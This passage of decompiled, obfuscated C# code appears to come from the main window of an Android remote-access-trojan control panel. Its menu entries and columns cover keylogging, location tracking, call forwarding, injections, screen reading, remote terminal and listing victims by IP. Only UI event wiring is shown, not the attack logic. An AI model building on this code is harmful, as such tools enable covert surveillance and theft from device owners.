			toolStripMenuItem = _ToolStrip_contct;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_apps
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_apps;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem9_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_apps;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_apps = value;
			toolStripMenuItem = _ToolStrip_apps;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_clifolder
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_clifolder;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem10_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_clifolder;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_clifolder = value;
			toolStripMenuItem = _ToolStrip_clifolder;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_trak
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_trak;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem11_Click_1;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_trak;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_trak = value;
			toolStripMenuItem = _ToolStrip_trak;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem BlockToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _BlockToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = BlockToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _BlockToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_BlockToolStripMenuItem = value;
			toolStripMenuItem = _BlockToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				Blockclient_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._770E4D24);
			};
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem12 = value;
			toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem13
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem13_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem13 = value;
			toolStripMenuItem = _ToolStripMenuItem13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_keylog
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_keylog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem14_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_keylog;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_keylog = value;
			toolStripMenuItem = _ToolStrip_keylog;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panel_list_block")]
	internal virtual Panel panel_list_block
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem16
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem16_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem16;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem16 = value;
			toolStripMenuItem = _ToolStripMenuItem16;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel_screens")]
	internal virtual Panel Panel_screens
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxnotify")]
	internal virtual DrakeUIContextMenuStrip ctxnotify
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem17
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem17_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem17;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem17 = value;
			toolStripMenuItem = _ToolStripMenuItem17;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_brows
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_brows;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem11_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_brows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_brows = value;
			toolStripMenuItem = _ToolStrip_brows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_chat
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_chat;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem19_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_chat;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_chat = value;
			toolStripMenuItem = _ToolStrip_chat;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FlowLayoutPanel1")]
	internal virtual FlowLayoutPanel FlowLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStrip_clipb
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_clipb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem20_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_clipb;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_clipb = value;
			toolStripMenuItem = _ToolStrip_clipb;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_lockscr
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_lockscr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem21_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_lockscr;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_lockscr = value;
			toolStripMenuItem = _ToolStrip_lockscr;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer contimer
	{
		[CompilerGenerated]
		get
		{
			return _contimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = contimer_Tick;
			System.Windows.Forms.Timer timer = _contimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_contimer = value;
			timer = _contimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_scrred
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_scrred;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ScreenReaderToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_scrred;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_scrred = value;
			toolStripMenuItem = _ToolStrip_scrred;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_ject
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_ject;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = InjectionsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_ject;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_ject = value;
			toolStripMenuItem = _ToolStrip_ject;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStrip_edits")]
	internal virtual ToolStripMenuItem ToolStrip_edits
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem NotesToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _NotesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				openNotes_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._6F661B73);
			};
			ToolStripMenuItem toolStripMenuItem = _NotesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_NotesToolStripMenuItem = value;
			toolStripMenuItem = _NotesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				RenamClient_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._0949590A);
			};
			ToolStripMenuItem toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RenameToolStripMenuItem = value;
			toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RedirectToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RedirectToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RedirectToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RedirectToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RedirectToolStripMenuItem = value;
			toolStripMenuItem = _RedirectToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel_updates")]
	internal virtual Panel Panel_updates
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mywebview")]
	internal virtual WebView2 mywebview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStrip_location
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_location;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStrip_location_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_location;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_location = value;
			toolStripMenuItem = _ToolStrip_location;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIScrollBar DrakeUIScrollBar1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIScrollBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIScrollBar1_ValueChanged;
			DrakeUIScrollBar drakeUIScrollBar = _DrakeUIScrollBar1;
			if (drakeUIScrollBar != null)
			{
				drakeUIScrollBar.ValueChanged -= value2;
			}
			_DrakeUIScrollBar1 = value;
			drakeUIScrollBar = _DrakeUIScrollBar1;
			if (drakeUIScrollBar != null)
			{
				drakeUIScrollBar.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W16")]
	internal virtual DrakeWidth_W DrakeWidth_W16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("barview")]
	internal virtual WebView2 barview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStrip_tools")]
	internal virtual ToolStripMenuItem ToolStrip_tools
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToastToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ToastToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				ShowToast_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._0A092A2A);
			};
			ToolStripMenuItem toolStripMenuItem = _ToastToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToastToolStripMenuItem = value;
			toolStripMenuItem = _ToastToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenLinkToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenLinkToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				Openlink_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._550C5F4F);
			};
			ToolStripMenuItem toolStripMenuItem = _OpenLinkToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenLinkToolStripMenuItem = value;
			toolStripMenuItem = _OpenLinkToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click_1;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem1 = value;
			toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem VibrateToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _VibrateToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = [SpecialName] [DebuggerHidden] (object a0, EventArgs a1) =>
			{
				SendVibrate_Click(RuntimeHelpers.GetObjectValue(a0), a1, EXGuarder._20563440);
			};
			ToolStripMenuItem toolStripMenuItem = _VibrateToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_VibrateToolStripMenuItem = value;
			toolStripMenuItem = _VibrateToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem TerminalToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _TerminalToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TerminalToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _TerminalToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_TerminalToolStripMenuItem = value;
			toolStripMenuItem = _TerminalToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CallPhoneToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CallPhoneToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CallPhoneToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CallPhoneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CallPhoneToolStripMenuItem = value;
			toolStripMenuItem = _CallPhoneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CallForwardingToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CallForwardingToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CallForwardingToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CallForwardingToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CallForwardingToolStripMenuItem = value;
			toolStripMenuItem = _CallForwardingToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel9
	{
		[CompilerGenerated]
		get
		{
			return _Panel9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = maintitle_MouseDown;
			Panel panel = _Panel9;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel9 = value;
			panel = _Panel9;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon hidbtn
	{
		[CompilerGenerated]
		get
		{
			return _hidbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _hidbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_hidbtn = value;
			drakeUIButtonIcon = _hidbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W7_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W7_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W7_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W7 = value;
			drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("navview")]
	internal virtual WebView2 navview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("homepanel")]
	internal virtual Panel homepanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("homeview")]
	internal virtual WebView2 homeview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClitopView")]
	internal virtual WebView2 ClitopView
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer FadeInTimer
	{
		[CompilerGenerated]
		get
		{
			return _FadeInTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = FadeInTimer_Tick;
			System.Windows.Forms.Timer timer = _FadeInTimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_FadeInTimer = value;
			timer = _FadeInTimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("NotifyVew")]
	internal virtual WebView2 NotifyVew
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ConView")]
	internal virtual WebView2 ConView
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blockview")]
	internal virtual WebView2 blockview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("updateview")]
	internal virtual WebView2 updateview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem RemoteSSHToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RemoteSSHToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RemoteSSHToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RemoteSSHToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RemoteSSHToolStripMenuItem = value;
			toolStripMenuItem = _RemoteSSHToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RemoteTelnetToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RemoteTelnetToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RemoteTelnetToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RemoteTelnetToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RemoteTelnetToolStripMenuItem = value;
			toolStripMenuItem = _RemoteTelnetToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStrip_blocker
	{
		[CompilerGenerated]
		get
		{
			return _ToolStrip_blocker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStrip_blocker_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStrip_blocker;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStrip_blocker = value;
			toolStripMenuItem = _ToolStrip_blocker;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon minimizbtn
	{
		[CompilerGenerated]
		get
		{
			return _minimizbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _minimizbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_minimizbtn = value;
			drakeUIButtonIcon = _minimizbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panel_notifys")]
	internal virtual Panel panel_notifys
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("stateview")]
	internal virtual WebView2 stateview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem autounlktoolstrip
	{
		[CompilerGenerated]
		get
		{
			return _autounlktoolstrip;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem2_Click_1;
			ToolStripMenuItem toolStripMenuItem = _autounlktoolstrip;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_autounlktoolstrip = value;
			toolStripMenuItem = _autounlktoolstrip;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem admintoolstrip
	{
		[CompilerGenerated]
		get
		{
			return _admintoolstrip;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem3_Click_1;
			ToolStripMenuItem toolStripMenuItem = _admintoolstrip;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_admintoolstrip = value;
			toolStripMenuItem = _admintoolstrip;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("walpclu")]
	internal virtual DataGridViewImageColumn walpclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("flgcliclu")]
	internal virtual DataGridViewImageColumn flgcliclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("scrcliclu")]
	internal virtual DataGridViewImageColumn scrcliclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clintnameclu")]
	internal virtual DataGridViewTextBoxColumn clintnameclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ipclinclu")]
	internal virtual DataGridViewTextBoxColumn ipclinclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("andoverclu")]
	internal virtual DataGridViewTextBoxColumn andoverclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("trakingclu")]
	internal virtual DataGridViewTextBoxColumn trakingclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("instdatclu")]
	internal virtual DataGridViewTextBoxColumn instdatclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("verclu")]
	internal virtual DataGridViewTextBoxColumn verclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("conicoclu")]
	internal virtual DataGridViewImageColumn conicoclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btryclu")]
	internal virtual DataGridViewImageColumn btryclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("actvclu")]
	internal virtual DataGridViewTextBoxColumn actvclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("jctcolmn")]
	internal virtual DataGridViewImageColumn jctcolmn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pngtxtclu")]
	internal virtual DataGridViewTextBoxColumn pngtxtclu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("favclmn")]
	internal virtual DataGridViewImageColumn favclmn
	{
